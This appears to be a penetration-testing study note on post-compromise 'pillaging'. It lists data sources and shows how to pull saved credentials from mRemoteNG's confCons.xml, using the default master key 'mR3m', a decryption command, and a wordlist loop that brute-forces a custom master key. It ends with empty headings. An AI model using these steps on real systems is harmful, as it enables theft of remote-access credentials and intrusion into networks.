### Content

- [Overview](#overview)
- [Abusing mRemoteNG](#abusing-mremoteng)
	- [Default Master Key](#default-master-key)
	- [Custom Master Key](#custom-master-key)

---
#### Overview

**Pillaging** is the process of obtaining information from a compromised system.
It cant be:

- Personal Information
- Corporate Blueprint
- Credit Card Data
- Server Information
- Infrastructure and Network Details
- Credentials with Different Types
- Any Relevant Piece of data to the corporate or to the assessment

##### Data Sources

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

---
### Abusing mRemoteNG

[mRemoteNG](https://mremoteng.org) is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols.

- `mRemoteNG` saves connection info and credentials to a file called `confCons.xml`.
- The default hardcoded password is `mR3m`
- The default configuration file located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG` directory.

Looking at `confCons.xml`

```XML
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFad*****" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/K****" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

- The root element `Connections` with information about the encryption.
	- The attribute `Protected` corresponds to the master password which is used to encrypt the document.
	- The attribute `Password` corresponds to the password which is encrypted with the master password.

##### Default Master Key

If the master password hasn't been changed, using [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password:

```bash
$ $ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/K****" 

Password: ASDki230kasd09fk233aDA
```

##### Custom Master Key

Attempt with a custom password, using [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password:

```bash
$ for password in $(cat fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3***" -p $password 2>/dev/null;done    
                              
```

---
### Abusing Cookies
#### IM Clients

